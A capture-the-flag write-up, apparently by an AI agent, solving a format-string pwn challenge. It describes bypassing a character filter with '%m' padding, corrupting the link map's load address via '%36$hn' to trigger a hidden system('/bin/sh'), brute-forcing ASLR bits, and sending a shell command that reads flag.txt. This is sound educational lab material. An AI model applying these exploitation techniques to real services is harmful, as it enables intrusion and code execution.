# WRITEUP.md — echo

## Running the challenge locally

The provided Docker setup is straightforward. The `Dockerfile` is based on `ubuntu:22.04`, installs `socat`, copies the challenge into `/opt/chal`, sets that as the working directory, exposes port `5000`, and runs `/opt/chal/entrypoint.sh`.

The entrypoint creates the local flag and launches the binary through `socat`:

```sh
echo "BKISC{fake_flag}" > "/opt/chal/flag.txt"
exec socat TCP-LISTEN:5000,reuseaddr,fork EXEC:/opt/chal/chall,stderr
```

If your image is already built, run it with port 5000 mapped, for example:

```sh
docker run --rm -p 5000:5000 <image-name>
```

Then connect manually:

```sh
nc 127.0.0.1 5000
```

Expected banner:

```text
Welcome to my echo chamber!
Shout your message:
```

The challenge only reads one message per process. Because `socat` uses `fork EXEC:/opt/chal/chall`, every connection starts a fresh `chall` process.

## Binary analysis summary

`src/chall` is a stripped 64-bit PIE executable:

```text
ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
```

Protections from ELF headers and dynamic metadata:

```text
PIE:      enabled
NX:       enabled
Canary:   enabled
RELRO:    full
```

The imported functions are small and revealing:

```text
puts, write, read, printf, system, mprotect, setbuf,
__stack_chk_fail, __libc_start_main, __cxa_finalize
```

Important strings:

```text
/bin/sh
Welcome to my echo chamber!
Shout your message:
printf "Your message is: "
```

There is an intentionally hidden shell path. The constructor at `PIE+0x1140` checks the byte at `PIE+0x2058`; if it is nonzero, it calls:

```c
system("/bin/sh");
```

However, `.init_array` runs in this order:

```text
PIE+0x1350
PIE+0x1140
PIE+0x1190
```

The function at `PIE+0x1190` runs after `PIE+0x1140`. It temporarily makes the `.rodata` page writable, writes `1` to `PIE+0x2058`, then makes the page read-only again. So the first call to `PIE+0x1140` does not spawn a shell, but any later call to it does.

## Vulnerable code path

The main routine does the following:

```c
puts("Welcome to my echo chamber!");
write(1, "Shout your message: ", 0x14);
n = read(0, buf, 0x10);
buf[n] = 0;
system("printf \"Your message is: \"");
filtered_printf(buf, n);
```

The filter scans the exact number of bytes returned by `read`. It rejects the following printable bytes:

```text
*ABEFGXabdefgiopsux
```

If no forbidden byte appears, the vulnerable sink is reached:

```c
printf(buf);
```

This is the real bug: the attacker controls the format string. The exploit uses only this bug. It does not use `/proc/id/map`, other `/proc` or `/sys` leaks, Docker metadata, environment leaks, helper files, or patched binaries.

## Why the filter is still exploitable

The filter blocks direct `%p`, `%s`, `%x`, `%d`, `%i`, and `%u`, but it leaves several powerful format features available:

```text
%m, %c, %n, %hn, %hhn, digits, $, h, l
```

`%m` is a glibc extension. It prints `strerror(errno)` and consumes no variadic argument. With a large field width, for example `%57328m`, it pads the output to exactly that many characters. This gives precise control of the value written by `%n`/`%hn` without consuming the argument that will be used as the write pointer.

During analysis I also confirmed that blocked leak specifiers can be synthesized at runtime. For example:

```text
%28708m%hn%22
```

The count `28708` is `0x7024`; written as a little-endian halfword, that is the two bytes `"$p"`. The original suffix `%22` becomes `%22$p` after `printf` has already passed the input filter, and it leaks argument 22. This is an attacker-visible leak through the challenge bug, not a debugger-only or external leak.

The final exploit does not need a runtime address leak, but the leak primitive was useful to verify stack positions and bases during analysis.

## The dynamic-loader trick

The key stable target is the main executable's `struct link_map`.

In the provided runtime, printf argument 36 is a pointer to the main link map. The first field of that structure is `l_addr`, the load address used by the dynamic loader when resolving dynamic-section pointers during finalization.

The normal `.fini_array` dynamic entry is:

```text
DT_FINI_ARRAY = 0x3d88
DT_FINI_ARRAYSZ = 8
```

The second `.init_array` entry is located at:

```text
PIE+0x3d78 = pointer to PIE+0x1140
```

If we corrupt `link_map->l_addr` from:

```text
PIE_base
```

to:

```text
PIE_base - 0x10
```

then the loader computes the fini-array address as:

```text
(PIE_base - 0x10) + 0x3d88 = PIE_base + 0x3d78
```

That points to the `.init_array` slot containing `PIE+0x1140`. When the process exits, `_dl_fini` calls that entry as a finalizer. At that time, constructor `PIE+0x1190` has already set the byte at `PIE+0x2058` to `1`, so `PIE+0x1140` calls:

```c
system("/bin/sh");
```

The exploit then sends shell commands after the initial 16-byte payload. Those bytes remain unread by `chall` and are consumed by the spawned shell.

## Payload construction

The payload format is:

```text
%<wanted_low16>m%36$hn
```

It is padded with NUL bytes to exactly 16 bytes, because `chall` reads at most 16 bytes. NUL bytes pass the filter and terminate the format string cleanly.

`%<wanted_low16>m` prints exactly `<wanted_low16>` characters while consuming no variadic argument. Then `%36$hn` writes that 16-bit count into the low two bytes of `link_map->l_addr`.

The PIE base is page-aligned. Its low 16 bits are one of:

```text
0x0000, 0x1000, 0x2000, ..., 0xf000
```

For every nonzero case, the desired low 16 bits of `PIE_base - 0x10` are:

```text
0x0ff0, 0x1ff0, ..., 0xeff0
```

Because each connection is a fresh exec and gets a new ASLR draw, the script cycles those 15 candidates. Each attempt has about a 1/16 success chance; expected success is around 16 connections.

This is not an external leak or accidental shortcut. It is a small brute force over the low 4 ASLR bits needed by the `%hn` write.

## Running the exploit

Use the final script:

```sh
python3 solve.py --host 127.0.0.1 --port 5000
```

Optional arguments are available for troubleshooting:

```sh
python3 solve.py --host 127.0.0.1 --port 5000 --attempts 256
python3 solve.py --host 127.0.0.1 --port 5000 --indices 36
```

The default command sent to the shell is:

```sh
echo __PWNED__; cat flag.txt 2>/dev/null || cat /opt/chal/flag.txt 2>/dev/null; exit
```

So in the Docker container it reads `/opt/chal/flag.txt` through the shell spawned inside the challenge process.

## Example successful output

I could not run Docker in this workspace because the Docker CLI is unavailable here, but I verified the same `socat` launch mode locally with a fake `flag.txt` in the service working directory. Example output:

```text
[*] attempt 13/64: arg=36 low16=0xcff0
[*] attempt 14/64: arg=36 low16=0xdff0
[*] attempt 15/64: arg=36 low16=0xeff0
[+] success with arg=36 low16=0xeff0
__PWNED__
BKISC{fake_flag}
```

Against the Docker service, the same command should print the flag created by `entrypoint.sh`.
